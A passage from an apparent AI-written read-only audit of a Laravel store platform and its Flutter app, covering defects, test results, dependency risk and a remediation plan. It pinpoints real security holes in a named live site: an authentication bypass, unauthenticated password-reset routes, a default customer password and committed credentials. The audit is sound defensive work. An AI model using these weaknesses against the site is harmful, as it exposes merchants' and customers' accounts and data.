  the UI layer). **A one-line Eloquent cast change in Repo A can take out a screen, and with zero tests
  nothing would catch it.** *Positive: no `json[...]!` assertions and no bare `int.parse(` anywhere in
  `lib/core/model/` — the two worst patterns are absent.* **UNKNOWN:** whether Repo A actually emits
  numeric strings. Capturing a few real responses decides whether this is urgent or latent.
- **No retry, no cancellation, no connection reuse.** `repo-B lib/network/network.dart` has none; a single
  30s timeout on a flaky connection is a hard user-visible failure, an in-flight call completes after its
  screen is disposed (and `_handleUnauthorized` can navigate from a dead route), and each call uses the
  top-level `http.get/post`, so there is no pooling. GET treats only `200` as success (`:376`) while
  POST/PUT accept `200||201` and DELETE `200||204` — a `204` from any GET endpoint becomes a `Failure`.
  `Map<String, dynamic>.from(jsonDecode(...))` at `:377-381` throws if an endpoint ever returns a
  top-level JSON **array**, and that throw lands in the generic catch-all as "unexpected_error", masking
  the real cause.
- **The repository layer discards the type safety the network layer built.** Only 2 of the methods read
  declare a return type; the rest are bare `async`, so they return `Future<dynamic>` and the
  `Result`/`Failure` sum type is thrown away at the layer boundary (`repo-B lib/config/repository/order_repository.dart:23,73,80,102,123,138`).
  Three endpoints are also inline string literals bypassing the 107 constants in `base_api.dart`
  (`order_repository.dart:86,107,127`).
- **A per-visit closure leak with duplicate network refetches.**
  `repo-B lib/core/controller/home_controller/store_change_service.dart:19-26` is an **append-only**
  `_resolvers` list — no dedup, no `unregister`, no `clear` — on a `permanent: true` service. Eight
  controllers call `register(() => this)` from `onInit`, and because they are `lazyPut`/`Get.put` per
  screen visit, every revisit appends another closure. After *n* visits a single store switch fires
  `resetForStoreChange()` *n* times — *n* duplicate network refetches — and the list never shrinks. The
  code comment at `:21-23` claims the closure form yields "the latest instance in memory"; that is
  **incorrect** — `() => this` captures the registering instance and pins that now-disposed controller in
  memory.
- **Dependency injection is applied inconsistently**, which is the class of defect that only appears in
  production navigation orders: 11 files in `repo-B lib/bindings/` of which **2 are entirely commented
  out**, 5 use `lazyPut` and 2 eager `Get.put` with no stated rule, and **34 `Get.put`/`Get.lazyPut` calls
  live outside `lib/bindings/` inside widgets**. `DeliveryBoyController` is constructed from **four**
  different owners. A `Get.find` on a screen reached by an unusual path can throw at runtime.
- **Notification tap routing is entirely unimplemented** —
  `repo-B lib/core/services/firebase_messaging_service.dart:210-240` decodes the payload and only
  `print`s; every `Get.toNamed` is commented out, and the commented targets `/order-details`,
  `/product-details` and `/messages` **do not exist in `repo-B lib/routes/routes.dart` either**, so
  uncommenting them would throw. Receipt and display work; only the deep link is missing. Related:
  **12 of 29 declared route constants are never registered** (`routes.dart:33-61` declares 29,
  `:66-159` registers 17).
- **A second FCM "send to backend" path is a stub that returns `true`** —
  `repo-B lib/core/services/firebase_messaging_service.dart:287-322` has the real HTTP call inside a block
  comment and returns `true` unconditionally, a false success signal. The app is saved only because a
  **duplicate** service, `repo-B lib/core/services/fcm_token_service.dart:100-108,167`, genuinely POSTs.
  Push registration works, but through two competing paths, one of which is a lie.
- **`IS_DEMO_MODE` can crash the app before `runApp`.** `repo-B lib/main.dart:38-40` uses
  `bool.parse(isDemoMode)` with **no try/catch**; `bool.parse` throws on anything but exactly
  `"true"`/`"false"`, so a stray space or `False` in a rebuilt `.env` is a **white-screen launch crash**.
  Also note demo mode gates cosmetics unevenly — there is **no demo guard on order creation, product or
  customer CRUD, delivery-boy CRUD, or wallet add/deduct balance** — so **it must not be relied on to
  protect a shared demo tenant.**
- **`flutter_localizations` is declared and never wired** — `repo-B pubspec.yaml:34-35` declares it and
  `grep -rn "localizationsDelegates\|supportedLocales" lib/` returns **0 hits** (re-verified). The
  `GetMaterialApp` at `repo-B lib/store_go.dart:32-58` sets `translations`, `locale` and `fallbackLocale`
  but neither delegate list nor `supportedLocales`, while Arabic is both the default
  (`repo-B lib/utils/prefer.dart:97-99`) and the fallback
  (`repo-B lib/translations/translation_service.dart:8`). Without `GlobalWidgetsLocalizations` the ambient
  `Directionality` is **LTR** while the text is Arabic, so the 34 `*Directional` layout calls resolve
  `start`/`end` as left/right and mirrored layouts silently do not mirror; only **3 screens** self-correct
  with an explicit `Directionality`; and Material built-ins such as date pickers render English labels.
  `TranslationService.isRTL` exists at `:31-33` and is **never called**. **This is the largest *product*
  defect in Repo B for an Arabic-first Syrian market** — HIGH, P0 on product grounds — and the pleasant
  surprise is that the translation **content is already done** (640/642 keys), so the fix is ~6 lines plus
  a full visual re-review. Budget the re-review honestly: layouts hand-tuned against an incorrect LTR
  direction will shift, and the hard `TextDirection.ltr` overrides at
  `repo-B lib/view/new_widgets/delivery_boy_widget.dart:79`, `customer_widget.dart:77`,
  `notification_screen.dart:346` and five in `statistics_screen_widget.dart` will fight the corrected
  global value. Chart axes legitimately want LTR and should keep explicit overrides.
- **`pubspec.yaml` contradicts the lockfile.** `repo-B pubspec.yaml:22` declares
  `sdk: '>=3.1.3 <4.0.0'` while the resolved 193-package set needs **Dart >= 3.9.0 and
  Flutter >= 3.35.1** (`repo-B pubspec.lock` tail, re-verified). A developer or CI runner honouring the
  manifest provisions an SDK on which the project cannot resolve. Compounding it,
  `repo-B .metadata:6-8` pins an opaque revision hash with no human-readable version, so **no file in the
  repo states the Flutter version to build with** — and `repo-B ios/Podfile`/`Podfile.lock` are **not
  tracked** either (and `repo-B ios/.gitignore` does not exclude them), so iOS pod versions are
  unreproducible. Combined with the stale iOS Firebase bundle id and the placeholder privacy string
  (`repo-B ios/Runner/Info.plist:67-68` is the verbatim template text `Explain why your app uses photo
  library`, an automatic App Store rejection, with **no `NSCameraUsageDescription`** despite `image_picker`
  being used), **there is no evidence the iOS target has ever been successfully built**. Either clear that
  path deliberately — it needs a macOS machine with Xcode, an Apple Developer account and Firebase console
  access — or **scope iOS out explicitly and ship Android first**, rather than carrying an untested target.

---

### 4.7 Defects promoted out of Section 2.1 — each settled by one command

These four were parked in Section 2.1 as "asserted but NOT independently verified" when a single grep or
`ls` settles each. The commands were run in `repo-A` for this document and their output is reproduced. None
is a security finding; all four are quality, correctness or product defects.

**(a) `public/js/custom.js` binds the `data-ajax-popup` click handler twice — CONFIRMED · LOW-MEDIUM / P2.**

```
$ grep -n "data-ajax-popup" public/js/custom.js
35:$(document).on('click', 'a[data-ajax-popup="true"], button[data-ajax-popup="true"], div[data-ajax-popup="true"]', ...
72:$(document).on('click', 'a[data-ajax-popup-over="true"], button[data-ajax-popup-over="true"], div[data-ajax-popup-over="true"]', ...
311:$(document).on('click', 'a[data-ajax-popup="true"], button[data-ajax-popup="true"], div[data-ajax-popup="true"]', ...
```

`repo-A public/js/custom.js:35` and `:311` register the **same** delegated selector on the **same**
`document`, so both handlers run on every matching click. `:311` sits under the comment
`/********* POS Module ********/` at `:310` and is the later, POS-flavoured copy. **`:72` is not a
duplicate** — it is the distinct `data-ajax-popup-over` handler, and an earlier draft that counted it as a
third registration was wrong. Consequence: a double-bound handler fires the modal twice, which means two
identical AJAX requests and two `#commanModel` population passes per admin-panel modal trigger.
**Severity LOW-MEDIUM, not HIGH as asserted:** it is wasted work and a confusing failure mode (an error in
one request is masked by the other succeeding), not a security or data-integrity defect. The asserted "263
modal triggers fire two requests each" figure was not re-counted and is not published here. One line to
delete; confirm in a browser network tab afterwards.

**(b) `DemoModeMiddleware` calls `handleDemoMode()`, which is defined nowhere — CONFIRMED · MEDIUM / P2.**

```
$ grep -rn "handleDemoMode" app/Http/Middleware/DemoModeMiddleware.php
82:                return $this->handleDemoMode($request);
88:                return $this->handleDemoMode($request);
94:                return $this->handleDemoMode($request);
100:                return $this->handleDemoMode($request);
$ grep -rn 'function handleDemoMode' . --include=*.php
$            # no output, exit status 1
```

Four call sites, zero definitions anywhere in the repository. Any request that the middleware decides to
block therefore produces `Error: Call to undefined method …::handleDemoMode()` instead of the intended
demo-mode refusal — a hard 500, not a graceful block. **This is a real defect, kept as one.** It is MEDIUM
rather than HIGH only because the `demo_mode` alias at `repo-A bootstrap/app.php:28` is currently applied
to **zero routes**, so the broken branch is unreachable today; the middleware is dead code whose first use
would fail. **Do not rely on demo mode as a security boundary, and do not enable the alias before the
method is written.**

**(c) `resources/lang/ar/` carries no core framework translations while `resources/lang/he/` does — CONFIRMED · MEDIUM / P1.**

```
$ ls resources/lang/ar/
chatwoot.php  installer_messages.php  myfatoorah.php
$ ls resources/lang/he/
auth.php  installer_messages.php  pagination.php  passwords.php  validation.php
```

The finding is confirmed, and its shape is worse than the Section 2.1 wording stated. `resources/lang/ar/`
does not merely lack `validation.php`, `auth.php`, `passwords.php` and `pagination.php` — it contains
**only** three vendor-specific catalogues (`chatwoot.php`, `installer_messages.php`, `myfatoorah.php`) and
**no core framework catalogue at all**. `resources/lang/he/` (Hebrew) ships `auth.php`, `pagination.php`,
`passwords.php` and `validation.php`. **Stated plainly: the shipped product translates Laravel's core
strings into Hebrew and not into Arabic.** This is a localisation gap, not a security defect, and it is
narrow: the application's *own* strings are translated — `resources/lang/ar.json` holds 2,848 keys against
`resources/lang/he.json`'s 2,817 — so what renders in English for an Arabic user is specifically the
framework-generated layer: validation messages, authentication failures, password-reset messages and
paginator labels. For an Arabic-market product that is a notable finding and a cheap fix: drop in the stock
Laravel Arabic catalogues.

**(d) No Arabic-capable webfont is declared anywhere — CONFIRMED ABSENT · MEDIUM / P1.**

```
$ grep -rliE "Noto Sans Arabic|Cairo|Tajawal|Almarai|Amiri" resources/views themes public/css
$            # no output, exit status 1
```

Zero matches across `resources/views`, `themes` and `public/css`. The families that *are* requested from
Google Fonts in those trees are Lato, Noto Sans (the Latin family, not Noto Sans Arabic), Nunito, Open
Sans, Overpass, Poppins and Roboto — none of which carries Arabic glyphs. Consequence: Arabic text renders
in whatever the client OS substitutes, which is uncontrolled and inconsistent across devices. **This also
bears on PDF output**, and that is where it is likely to be worst. The only PDF renderer in the dependency
set is `barryvdh/laravel-dompdf` (`repo-A composer.json:16`), and a PDF renderer does not inherit the
client OS font fallback that saves a browser — it embeds the fonts it is given, so a document whose
stylesheet names only Latin families has no Arabic glyph to fall back to. The two `loadView` call sites
found are both in addon packages
(`repo-A packages/workdo/PDFVouchers/src/app/Http/Controllers/MailSettingController.php`,
`repo-A packages/workdo/ProductCatelog/src/app/Http/Controllers/ProductCatelogController.php`) and
`grep -rn "PDF::|Pdf::" app/ --include=*.php` returns nothing, so **whether order invoices are rendered as
PDF at all was NOT traced and is UNKNOWN** — the exposure is stated for the PDF paths that do exist, not
asserted for invoices. Note the boundary of the font claim itself: **absence of a declaration is proven; what a browser or dompdf
actually renders was NOT OBSERVED** — no browser or PDF render was performed in this environment
(Appendix B). Fixing it needs a licensing decision from the owner, not only code (see doc 10, M-06).

---

## 5. TEST FINDINGS — exactly what was run, and what was not

This section distinguishes **NOT EXECUTED** from **FAILED**. Nothing below is extrapolated: every command
and its real output is reproduced.

### 5.1 What was executed, with real output

**Repo A — PHP toolchain present.**
```
$ php -v
PHP 8.3.6 (cli) (built: Sep  2 2026 12:56:02) (NTS)
```
This satisfies `repo-A composer.json`'s `"php": "^8.2"`. From `php -m`: `openssl`, `pdo`, `pdo_mysql`,
`pdo_sqlite`, `mbstring`, `json`, `curl`, `gd`, `intl`, `redis` are present. Two extensions required by
`repo-A config/installer.php:28,30` — **`tokenizer` and `zip`** — were **not confirmed**, because they
sort past the output window that was inspected. `pdo_sqlite` being present matters: it is the prerequisite
for the SEC-18 fix.

**Repo A — syntax lint across the entire repository. PASSED.**
```
$ find . -name '*.php' -type f | wc -l
3113
$ find app routes config database -name '*.php' -print0 | xargs -0 -n1 -P4 php -l 2>&1 | grep -v 'No syntax errors' | head -10
(no output)
```
Re-run and re-confirmed while writing this document for `app/`, `routes/`, `config/` and `database/`. The
auditor's wider sweep covered all 3,113 PHP files — including all 1,956 under `packages/workdo/`, the 611
under `themes/ public/ resources/ bootstrap/ stubs/`, plus `index.php` and `artisan` — and reported **zero
syntax errors**.

**This is a genuine positive, and it is also a weak signal.** `php -l` parses only; it does not resolve
classes, so the undefined-`Schedule` defect in Section 4.3 is **invisible to it**. The right conclusion is
"the codebase parses" — not "the codebase runs".

**Repo A — `composer validate`. PASSED.**
```
$ composer validate --no-check-all --no-check-publish
Composer plugins have been disabled for safety in this non-interactive session.
./composer.json is valid
```

**Repo A — repository state.**
```
$ git rev-parse HEAD
efe05d9f1d770c5fef86d9d8175ff013f8d71ee2
$ git rev-parse --abbrev-ref HEAD
claude/pensive-cerf-h6rizn
$ git status --porcelain | wc -l
0
```
Clean tree. **Nothing in either repository was modified by this audit.**

### 5.2 What was NOT EXECUTED, and why — BLOCKED

**Repo A — the PHPUnit suite was NOT EXECUTED. It did not fail.**
```
$ ls vendor 2>&1 | head -3
ls: cannot access 'vendor': No such file or directory
```
`repo-A .gitignore:3` ignores `/vendor/`, so this is expected rather than corruption. But
`repo-A phpunit.xml:4` sets `bootstrap="vendor/autoload.php"`, so `vendor/bin/phpunit` does not exist and
cannot be invoked. `composer install` was **not** run, per the audit's read-only mandate.
**Consequence: no claim whatsoever is made in this document about whether the test suite passes.**
Independently, SEC-18 means the suite **must not** be executed from any checkout carrying the committed
`.env` until `phpunit.xml:25-26` is uncommented.

**Repo A — every `php artisan` command was NOT EXECUTED (BLOCKED).** Same cause: `artisan` requires
`vendor/autoload.php`. Therefore this document contains **no** `route:list`, `schedule:list`,
`migrate --pretend` or `config:show` output. Three findings depend on commands that could not be run and
are labelled accordingly: the effective middleware stack per URI (Section 2.2(a) — needs `route:list`),
the undefined-`Schedule` defect (Section 4.3 — needs `schedule:list`), and the installer's `canInstall`
gate (SEC-33 — needs the absent package source).

**Repo A — static analysis was NOT EXECUTED, and is also MISSING.** PHPStan, Psalm, Rector and Pint are
neither installed nor configured:
```
$ ls pint.json phpstan.neon psalm.xml rector.php .php-cs-fixer.php
ls: cannot access 'pint.json': No such file or directory
... (all five absent)
```
`laravel/pint` **is** required at `repo-A composer.json:78` and has no configuration and has never been
run.

**Repo A — no live HTTP request was issued.** The sandbox egress proxy refused CONNECT to
storesyria.com:443 (curl exit 56 / HTTP 403) for every probed path. So SEC-32, SEC-25 and SEC-33 are
PARTIAL rather than VERIFIED on the reachability limb, and **one `curl -I` per path from outside the
sandbox is the single highest-value next check in this entire audit.**

**Repo A — no database access.** No migration, no seeder, no query. Everything about production schema and
runtime settings is UNKNOWN.

**Repo B — the entire Flutter toolchain is BLOCKED.**
```
$ which flutter; flutter --version
flutter: not found
$ which dart; dart --version
dart: not found
$ ls -la /home/user/StoreSyria_app98/.dart_tool
ls: cannot access '.dart_tool': No such file or directory
```
Re-verified while writing this document. Therefore **`flutter analyze`, `flutter pub get`, `flutter test`
and `flutter build` were not attempted**, and this document makes **no claim about whether Repo B
compiles**, no analyzer issue count, no test result, no `pub outdated` output and no APK or IPA size.
Every Repo B statement is static source reading.

### 5.3 Existing test coverage — the inventory

**Repo A: zero business-logic coverage.**
```
$ find tests -type f | wc -l
10
```
All ten were read and are **byte-for-byte the Breeze/Laravel-11 generator output**: `tests/TestCase.php` is
an empty shell (`:7-10`), `tests/Unit/ExampleTest.php:12-15` is `assertTrue(true)`,
`tests/Feature/ExampleTest.php:13-18` is the stock `get('/')` smoke test, and the remaining seven cover
only framework auth and profile flows. **Nothing in `tests/` touches the platform's business domain** —
no orders, checkout, cart, tenancy, plans, coupons, delivery, wallet, the ~30 payment gateways, the Zid
integration or the 39 DataTables. Against 95 Models, 158 `app/Http` files and 69 addon modules, effective
business-logic coverage is **0%**.

Module-level tests: exactly one `Tests` directory exists across all 69 modules and it holds two `.gitkeep`
placeholders (`repo-A packages/workdo/LandingPage/src/Tests/{Unit,Feature}/.gitkeep`); a search for
`*Test.php`, `phpunit.xml*` or `pest.php` anywhere under `packages/workdo` returns nothing. And
`repo-A phpunit.xml:7-14` registers only `tests/Unit` and `tests/Feature`, so **even if module tests
existed they would not be collected.**

Absent entirely: Pest, Dusk, Cypress, Playwright, Jest, Vitest, Behat, Codeception, and any `tests/Browser`
directory. `repo-A package.json:4-7` has only `"dev": "vite"` and `"build": "vite build"` — **no `test`,
no `lint`** — and `repo-A composer.json:104-120` has only Laravel's stock lifecycle hooks, with **no
`test` or `analyse` script**.

**A secondary observation, NOT EXECUTED.** Had the stock tests been runnable, several would likely fail
against this customised app regardless of the database issue: `repo-A tests/Feature/ProfileTest.php:37`
asserts `->assertRedirect('/profile')` after `PATCH /profile`, but
`repo-A app/Http/Controllers/ProfileController.php:37` returns `Redirect::route('profile.edit')`, and
`repo-A routes/web.php:333` names the route `auth.profile.update` rather than Breeze's `profile.update`.
The routes the tests need do exist, so these are plausibly **stale assertions** rather than missing
endpoints — which reinforces the point that the scaffolding is not merely thin, it is probably
unmaintained and red. **Inference, not executed.**

**Repo B: one test, and it cannot pass.** `repo-B test/` contains exactly one file.
`repo-B test/widget_test.dart:13-20` is the unmodified `flutter create` template:
```dart
13: testWidgets('Counter increments smoke test', (WidgetTester tester) async {
15:   await tester.pumpWidget(StoreGoApp());
18:   expect(find.text('0'), findsOneWidget);
```
`StoreGoApp` is a merchant console with no counter and no `Icons.add` at its root — and `pumpWidget` would
fail earlier in any case, because `StoreGoApp` depends on `GetStorage.init()`, `Firebase.initializeApp()`
and `dotenv.load()`, which happen only in `main()`. **So the suite is not merely empty, it is red.**
`repo-B ios/RunnerTests/RunnerTests.swift:7-10` is likewise the empty stock `testExample()`. **Zero
business-logic tests for 53,018 lines**: nothing covers the `Result`/`Failure` sum type, the 29 model
`fromJson` paths, the 18 repositories or the order-creation flow. **No CI in either repo**: no `.github/`,
no `.gitlab-ci.yml`, no `codemagic.yaml`.

**The consequence, stated plainly for the decision.** None of the 36 confirmed findings in Section 1 would
have been caught by automation, and **there is no regression harness to protect any fix.** That is why
Section 7 puts the safety net alongside the P0 security work rather than after it.

---

## 6. DEPENDENCY RISK ASSESSMENT

> **This is explicitly version-and-name-based reasoning. It is NOT a CVE scan.** No network vulnerability
> scanner was run, no advisory database was consulted, and **no CVE number is asserted anywhere in this
> document.** The "abandoned" column below is `composer.lock`'s **own** metadata, read with `jq`; everything
> else is reasoning from package names, version numbers and release dates. Nothing here states that a
> specific vulnerability is present or absent. Running `composer audit` and `npm audit` against a live
> advisory database is a Section 7 action item, not a result reported here.

### 6.1 Repo A — upstream-declared abandoned packages

Read directly from the lockfile:
```
$ jq -r '.packages[] | select(.abandoned != null) | "\(.name) \(.version) abandoned=\(.abandoned)"' composer.lock
mercadopago/sdk v0.5.6 abandoned=true
rachidlaasri/laravel-installer 4.1.0 abandoned=true
xendit/xendit-php-clients 6.0.0 abandoned=xendit/xendit-php
```

| Package | Version | Why it matters *in this context* |
|---|---|---|
| `rachidlaasri/laravel-installer` | 4.1.0, released **2020-05-19** | The **install and upgrade path of a payment-handling platform**, six years stale, receiving no security fixes — and web-exposed with the `/update` migration route enabled (SEC-33) |
| `mercadopago/sdk` | v0.5.6 | A **live payment SDK**, pre-1.0, abandoned. Any SDK-side protocol or signature change is unpatched |
| `xendit/xendit-php-clients` | 6.0.0 | Superseded; the lockfile **names the successor** (`xendit/xendit-php`), so the migration target is already identified |

### 6.2 Repo A — unstable and unpinned constraints

From `repo-A composer.json` (62 `require` entries):

| Constraint | Resolved | Risk class |
|---|---|---|
| `maatwebsite/excel: ^3.1.x-dev` | `3.1.x-dev` | Tracks a **moving dev branch**, not an immutable release. Any `composer update` pulls unreviewed branch HEAD into a payment-adjacent application. This is **supply-chain** exposure, not known-vulnerability exposure |
| `myfatoorah/laravel-package: *` | — | Wholly unconstrained: it will accept **any** future major version, breaking changes included, **in a payment integration** |

### 6.3 Repo A — versions worth checking against an advisory database

Reasoning only; no claim of exploitability.

| Package | Version | Note |
|---|---|---|
| `laravel/framework` | v11.47.0 | Current 11.x. Reasonable |
| `laravel/sanctum` | v4.0.5 | Current. **Note: SEC-01 means Sanctum's verification is bypassed in *application* code, not broken in the library** |
| `phpoffice/phpspreadsheet` | 1.30.1 | The 1.x line; 2.x/3.x supersede it. Historically a recurring advisory target. Pulled in via `maatwebsite/excel`, so an upgrade is **coupled to the dev-branch problem above** |
| `dompdf/dompdf` + `barryvdh/laravel-dompdf` | v3.0.0 | dompdf has a history of SSRF and local-file-read issues. 3.0.0 is recent — **verify `isRemoteEnabled` is off wherever PDFs render user-supplied HTML** |
| `shetabit/visitor` | v4.3.1 | Low-profile package with a small maintainer surface; writes the `shetabit_visits` table queried at `repo-A app/Http/Controllers/ThemeAnalyticController.php:64-66` |
| `firebase/php-jwt` v6.10.2, `guzzlehttp/guzzle` 7.10.0, `stripe/stripe-php` v15.10.0, `yajra/laravel-datatables` v11.0.0, `pragmarx/google2fa-laravel` v2.2.0 | — | No version-based concern |

**One structural note that changes how dependency risk should be read here.** The 69 `packages/workdo/`
addon modules are **not** managed by Composer at all — they are vendored source in-tree and
PSR-4-injected at runtime from a database table (`repo-A app/Providers/PackageServiceProvider.php:32,61,79`).
So `composer audit` will **never** see them, and ~88% of the repository's file count sits outside any
dependency-management or advisory process. Addon code must be reviewed by hand or not at all.

**The npm side is small and clean.** `repo-A package.json` has **no runtime `dependencies`** — only 8
devDependencies (`vite`, `tailwindcss`, `axios`, `alpinejs`, `postcss`, `autoprefixer`,
`@tailwindcss/forms`, `laravel-vite-plugin`). Build-time only; `package-lock.json` governs resolution. Not
a meaningful attack surface.

**A publicly readable lockfile is itself the dependency risk here.** Per SEC-32, `/composer.lock` (616,086
bytes, 239 pinned packages) is very likely fetchable without authentication, which hands an attacker the
exact version of every dependency — i.e. it removes the fingerprinting step from any advisory-driven
attack. That is why moving the document root (SEC-32) is a dependency-risk mitigation as much as an
information-disclosure one.

### 6.4 Repo B — dependency inventory

193 packages resolved. Measured by `grep -rl "package:<name>/" lib/` returning zero files:

| Declared but unused | pubspec line | Note |
|---|---|---|
| `win32: ^5.15.0` | `:49` | **Windows API bindings in a portrait-locked mobile app.** Inexplicable |
| `flutter_quill: ^11.5.0` | `:50` | A rich-text editor, never imported. Heavy (see R-27) |
| `firebase_analytics: ^10.10.7` | `:62` | **Not wired** — no analytics event is ever logged |
| `firebase_remote_config: ^4.4.7` | `:60` | **Not wired** — no remote flag is ever read |
| `flutter_localizations` | `:34-35` | Declared, never wired — **this is the RTL defect in Section 4.6** |
| `multi_select_flutter`, `fluttertoast`, `floating_bottom_navigation_bar` | `:53`, `:41`, `:73` | Superseded by in-house or alternative widgets that **are** used |
| `cupertino_icons`, `flutter_launcher_icons` | `:37`, `:36` | Conventional / build-time tool; the latter belongs in `dev_dependencies` |

`device_preview: ^1.3.1` (`:72`) is a **runtime** dependency shipped in release and wired at
`repo-B lib/main.dart:57` as `DevicePreview(enabled: false, …)` — permanently off, but still linked into
the binary. It belongs in `dev_dependencies` behind a debug flag.

**Version-age spread, stated precisely and fairly.** The Firebase set is a full generation behind —
`firebase_core 2.32.0`, `firebase_messaging 14.7.10`, `firebase_crashlytics 3.5.7`,
`firebase_analytics 10.10.7`, `firebase_remote_config 4.4.7` — sitting next to bleeding-edge
`syncfusion_flutter_charts 34.1.32` and `device_preview 1.3.1`, on a lock demanding Flutter >= 3.35.1.
**These versions are mutually resolvable — the lockfile proves it — so this is NOT a dependency
conflict.** The risk is different and still real: Firebase 2.x/14.x is approaching end of support, pulls
older Android Firebase BoM artifacts, and is the generation most likely to break on a new Xcode or a Play
target-SDK bump. That is also the most likely reason an iOS build attempt (Section 4.6) would force a
Firebase upgrade, which touches `main.dart`, both FCM services and the native config.

**Licensing, not vulnerability, is the sharpest dependency risk in Repo B.** `syncfusion_flutter_charts`
is commercial, used in two live screens, with no registered licence key (Section 1.11). Resolve the
commercial question before any release.

### 6.5 Dependency recommendations

1. **Pin `maatwebsite/excel`** to a released version — this also unblocks a `phpoffice/phpspreadsheet`
   1.x → 3.x upgrade, which is currently coupled to the dev branch.
2. **Constrain `myfatoorah/laravel-package`** from `*` to a caret range.
3. **Plan migration off all three abandoned packages**, in this order: the installer (removal — see
   SEC-33), `xendit/xendit-php-clients` → `xendit/xendit-php` (the successor is named for you), then
   `mercadopago/sdk`. *Risk: payment SDK swaps need sandbox testing against the real gateway; a botched
   MercadoPago migration breaks live checkout. First confirm **which** gateways are actually enabled in
   production — several of the ~30 may be dormant, which would shrink this work substantially.*
4. **Add `composer audit` and `npm audit` to CI** — which means **standing up CI first**, since there is
   none. That is also the only durable way to stop regressions on everything in Section 7.
5. **Repo B**: drop the 10 unused dependencies (notably `win32` and `flutter_quill`), move
   `device_preview` and `flutter_launcher_icons` to `dev_dependencies`, correct
   `repo-B pubspec.yaml:22` to `sdk: '>=3.9.0 <4.0.0'` to match the lock, and record the Flutter version
   in an `.fvmrc` or `.tool-versions`.

---

## 7. PRIORITISED REMEDIATION PLAN

Ordered by risk reduction per unit of effort, not by severity alone. Every item names what it solves, what
can be **reused** rather than rewritten, the risk of doing it, and its prerequisites. Nothing here was
applied — this is a read-only audit.

**Two framing rules for the owner.**
First, **P0-A can be done in days, not months.** It is dominated by configuration changes and single-file
edits. Second, **do not start P0-B before the test harness in P0-A/6 exists**, because five of the P0-B
items change the behaviour of hundreds of queries and there is currently nothing to catch a regression.

### P0-A — Stop the ongoing exposure (days)

**1. Rotate every exposed credential, then purge git history.** *(SEC-16 — the top item, and the evidence
supports that placement: these values are in commit `3c39c160` and the repository has been cloned, so they
must be treated as public today.)*
- **Order matters.** Rotate **first** — purging does not un-leak an already-cloned repo — then
  `git filter-repo --invert-paths --path .env --path error_log --path composer.phar --path "_active', 1)"
  --path uploads/`, force-push, and have every clone re-cloned. The repo is 6 commits, so the rewrite is
  cheap.
- Rotate: `APP_KEY`, `DB_PASSWORD`, `REDIS_PASSWORD`, `MAIL_PASSWORD`, all `PUSHER_*`, all `REVERB_*`,
  `FIREBASE_CREDENTIALS` (`repo-A .env:3,13,22,29,32-34,36-38,43,52`), plus `zid.client_secret` and
  `zid.hook_pass` (`repo-A config/services.php:31,34`) and `deliverysyria.api_key` (`:44`).
- Replace the `config/services.php` literals with `env()` calls — **and fix the latent fail-open at
  `repo-A routes/web.php:988-989` in the same commit**, or that move activates it (SEC-14).
- `git rm --cached .env`; replace the 5-line `.gitignore` with the stock Laravel 11 file plus `/uploads/`,
  `bootstrap/cache/*.php`, `error_log`, `composer.phar`, `_active*`.
- **Plan this explicitly:** rotating `APP_KEY` invalidates every session **and breaks decryption of every
  `Crypt`-encrypted column**, including the Zid credential rows at `repo-A app/Services/Zid.php:15-16`.
  Those rows must be re-encrypted or the merchants re-authorised. Do not discover that in production.

**2. Replace `CustomAuth` with real token verification.** *(SEC-01 — one 55-line file that defeats
authentication on 189 routes and is the precondition for six other findings.)*
- **Reuse:** `laravel/sanctum` 4.0.5 is already installed, `HasApiTokens` is already on both models, and
  **the correct hash comparison already exists in this codebase** at
  `repo-A app/Http/Controllers/Api/DashboardController.php:625-628` and can be lifted verbatim if the
  three-guard dispatch must be retained. Otherwise point the alias at `auth:sanctum`.
- Make a **missing** `Authorization` header a 401 instead of falling through at `CustomAuth.php:54`.
- **Risk — read this before scheduling it:** every endpoint currently relying on anonymous pass-through
  will start returning 401, including the `*-guest` routes
  (`repo-A routes/api.php:61,64,66,73,77,80,83,85,105,112,118,120`) which appear designed for anonymous
  browsing. **Enumerate the intended-public endpoints first and move them to a genuinely public group, or
  the storefront and Repo B both break at once.** Repo B must be re-tested and must ship in lockstep.
- **Prerequisite:** resolve the duplicate route registration (item 7), because it determines which alias
  registration applies.

**3. Delete or rewrite the three unauthenticated password paths.** *(SEC-02, SEC-03.)*
- Delete `repo-A app/Http/Controllers/Api/AuthController.php:246-410` and the anonymous
  `customer_id` branch of `ApiController::change_password` (`:5751-5760`). Add a `permission:` check and
  an ownership check to `repo-A routes/web.php:662-663` →
  `StoreController::storeResetPasswordUpdate`, and decrypt `{id}` as its GET sibling does.
- **Reuse, do not write anything new:** port `CustomerLoginController::resetPassword` (`:837-877`, a
  correct broker reset) and `::verifyPasswordOtp` (`:360-429`, a correct hashed-OTP flow) to the API.
- **Risk:** the mobile forgot-password screen breaks and must ship in lockstep. **Any customer currently
  holding `hello@1234` needs a forced reset.**
- **Prerequisite:** add `throttle:` and an attempt counter (item 5).

**4. Close the nine unauthenticated route blocks.** *(SEC-04, SEC-06, SEC-13, SEC-14, SEC-05, SEC-07.)*
- Add authentication to `repo-A routes/api.php:163-169` and `:203-211`, `:139`, `:160` — **but note that
  adding `custom.auth` is not a fix until item 2 lands**, and tenant resolution must move server-side.
- Move `repo-A routes/web.php:940-973` inside the `auth` group at `:326`.
- Add `auth:customers` plus a `customer_id` ownership check to `repo-A routes/customer.php:142,143,144`.
- Add `->middleware('auth')` to `repo-A routes/web.php:978` (copy `:984`, already correct); **delete** the
  `repo-A routes/web.php:1026-1120` closure; add `hash_equals` verification to
  `repo-A routes/api.php:376` modelled on `DeliverySyriaOrderController.php:157-163`; **delete**
  `repo-A routes/api.php:381-384`.
- **Risk:** low — these should never have been anonymous. If a client depends on one, **that dependency is
  itself the vulnerability.** Check Repo B first: it calls `orderlist`, `productlist` and `categorylist`.
  Coordinate the DeliverySyria shared secret, or courier status callbacks stop.

**5. Turn on rate limiting and fix the OTP flow.** *(SEC-24.)* Call `$middleware->throttleApi()` in
`repo-A bootstrap/app.php`; add `throttle:` to `repo-A routes/api.php:50-52` and
`repo-A routes/customer.php:96-119`; add an attempt counter to both OTP verifications; key the API login
limiter on `email|ip` as `repo-A app/Http/Requests/Auth/LoginRequest.php:81-84` already does for web.
Replace the 4-digit plaintext OTP with the web flow's hashed 6-digit implementation. *Low risk; this is
what makes items 2-4 hold under enumeration.*

**6. Stop the test suite from being able to destroy production, and stand up a harness.** *(SEC-18 —
~1 hour for the first half.)* Uncomment `repo-A phpunit.xml:25-26`, add `DB_FOREIGN_KEYS=true`, and commit
